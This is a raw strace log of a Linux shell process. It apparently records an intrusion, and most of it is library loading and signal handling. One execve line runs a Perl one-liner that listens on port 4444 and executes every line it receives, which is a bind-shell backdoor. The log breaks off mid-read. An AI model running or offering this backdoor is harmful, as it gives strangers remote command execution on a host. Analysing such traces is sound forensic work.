7462  07:18:53.209704 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
7462  07:18:53.209720 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f0e000
7462  07:18:53.209731 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
7462  07:18:53.209779 read(1, "", 4096) = 0
7462  07:18:53.209788 close(1)          = 0
7462  07:18:53.209797 munmap(0xb7f0e000, 4096) = 0
7462  07:18:53.209813 open("/etc/ld.so.cache", O_RDONLY) = 1
7462  07:18:53.209825 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
7462  07:18:53.209853 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f07000
7462  07:18:53.209891 close(1)          = 0
7462  07:18:53.209918 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7462  07:18:53.209946 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
7462  07:18:53.209961 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
7462  07:18:53.210065 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
7462  07:18:53.210082 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d79000
7462  07:18:53.210094 mmap2(0xb7d80000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7d80000
7462  07:18:53.210111 close(1)          = 0
7462  07:18:53.210122 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7462  07:18:53.210135 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
7462  07:18:53.210148 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
7462  07:18:53.210233 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
7462  07:18:53.210250 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d61000
7462  07:18:53.210261 mmap2(0xb7d75000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7d75000
7462  07:18:53.210275 mmap2(0xb7d77000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d77000
7462  07:18:53.210288 close(1)          = 0
7462  07:18:53.210314 munmap(0xb7f07000, 29913) = 0
7462  07:18:53.210343 open("/etc/ld.so.cache", O_RDONLY) = 1
7462  07:18:53.210378 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
7462  07:18:53.210394 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f07000
7462  07:18:53.210421 close(1)          = 0
7462  07:18:53.210431 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7462  07:18:53.210446 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
7462  07:18:53.210459 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
7462  07:18:53.210546 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
7462  07:18:53.210567 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d57000
7462  07:18:53.210578 mmap2(0xb7d5f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7d5f000
7462  07:18:53.210594 close(1)          = 0
7462  07:18:53.210606 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7462  07:18:53.210619 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
7462  07:18:53.210633 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
7462  07:18:53.210720 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
7462  07:18:53.210736 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d4c000
7462  07:18:53.210747 mmap2(0xb7d55000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d55000
7462  07:18:53.210763 close(1)          = 0
7462  07:18:53.210783 munmap(0xb7f07000, 29913) = 0
7462  07:18:53.210799 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
7462  07:18:53.210812 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
7462  07:18:53.210823 _llseek(1, 0, [0], SEEK_CUR) = 0
7462  07:18:53.210847 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
7462  07:18:53.210882 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f0e000
7462  07:18:53.210893 _llseek(1, 1624, [1624], SEEK_SET) = 0
7462  07:18:53.210925 munmap(0xb7f0e000, 1624) = 0
7462  07:18:53.210934 close(1)          = 0
7462  07:18:53.210962 getpgrp()         = 3831
7462  07:18:53.210972 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
7462  07:18:53.210987 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
7462  07:18:53.211003 brk(0x8101000)    = 0x8101000
7462  07:18:53.211033 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
7462  07:18:53.211048 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
7462  07:18:53.211062 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
7462  07:18:53.211098 brk(0x8102000)    = 0x8102000
7462  07:18:53.211123 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
7462  07:18:53.211141 stat64("/sbin/AB", 0xbf8b5f08) = -1 ENOENT (No such file or directory)
7462  07:18:53.211154 stat64("/bin/AB", 0xbf8b5f08) = -1 ENOENT (No such file or directory)
7462  07:18:53.211165 stat64("/usr/sbin/AB", 0xbf8b5f08) = -1 ENOENT (No such file or directory)
7462  07:18:53.211177 stat64("/usr/bin/AB", 0xbf8b5f08) = -1 ENOENT (No such file or directory)
7462  07:18:53.211190 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
7462  07:18:53.211204 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d826f8) = 7463
7463  07:18:53.211248 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7463  07:18:53.211264 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
7463  07:18:53.211277 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
7463  07:18:53.211288 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
7463  07:18:53.211305 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
7463  07:18:53.211334 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
7463  07:18:53.211349 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
7463  07:18:53.211439 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
7463  07:18:53.211453 --- SIGPIPE (Broken pipe) @ 0 (0) ---
7463  07:18:53.211516 exit_group(127)   = ?
7462  07:18:53.226370 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7462  07:18:53.226371 --- SIGCHLD (Child exited) @ 0 (0) ---
7462  07:18:53.226371 waitpid(-1,  <unfinished ...>
4519  07:18:53.226371 waitpid(7462,  <unfinished ...>
7462  07:18:53.226371 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 7463
7462  07:18:53.226371 waitpid(-1, 0xbf8b5b88, WNOHANG) = -1 ECHILD (No child processes)
7462  07:18:53.226371 sigreturn()       = ? (mask now [])
7462  07:18:53.226372 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
7462  07:18:53.226372 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7462  07:18:53.226372 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
7462  07:18:53.226372 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
7462  07:18:53.226373 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7462  07:18:53.226373 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
7462  07:18:53.226373 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
7462  07:18:53.226373 stat64("/sbin/perl", 0xbf8b5f38) = -1 ENOENT (No such file or directory)
7462  07:18:53.226373 stat64("/bin/perl", 0xbf8b5f38) = -1 ENOENT (No such file or directory)
7462  07:18:53.226374 stat64("/usr/sbin/perl", 0xbf8b5f38) = -1 ENOENT (No such file or directory)
7462  07:18:53.226374 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
7462  07:18:53.226374 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
7462  07:18:53.226428 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
7462  07:18:53.226443 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d826f8) = 7464
7464  07:18:53.226506 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7464  07:18:53.226521 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
7464  07:18:53.226534 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
7464  07:18:53.226546 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
7464  07:18:53.226561 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
7464  07:18:53.226576 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
7464  07:18:53.226589 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
7464  07:18:53.226621 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
7464  07:18:53.226704 brk(0)            = 0x8153000
7464  07:18:53.226723 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7464  07:18:53.226737 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f84000
7464  07:18:53.226753 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
7464  07:18:53.226770 open("/etc/ld.so.cache", O_RDONLY) = 1
7464  07:18:53.226782 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
7464  07:18:53.226798 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f7c000
7464  07:18:53.226808 close(1)          = 0
7464  07:18:53.226818 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7464  07:18:53.226833 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
7464  07:18:53.226847 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
7464  07:18:53.227032 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
7464  07:18:53.227050 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f78000
7464  07:18:53.227062 mmap2(0xb7f7a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f7a000
7464  07:18:53.227078 close(1)          = 0
7464  07:18:53.227090 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7464  07:18:53.227103 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
7464  07:18:53.227117 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
7464  07:18:53.227202 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
7464  07:18:53.227219 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f53000
7464  07:18:53.227230 mmap2(0xb7f76000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7f76000
7464  07:18:53.227245 close(1)          = 0
7464  07:18:53.227256 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7464  07:18:53.227269 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
7464  07:18:53.227283 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
7464  07:18:53.227367 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
7464  07:18:53.227425 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f52000
7464  07:18:53.227455 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f3a000
7464  07:18:53.227483 mmap2(0xb7f4e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f4e000
7464  07:18:53.227498 mmap2(0xb7f50000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f50000
7464  07:18:53.227511 close(1)          = 0
7464  07:18:53.227522 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
7464  07:18:53.227535 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
7464  07:18:53.227548 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 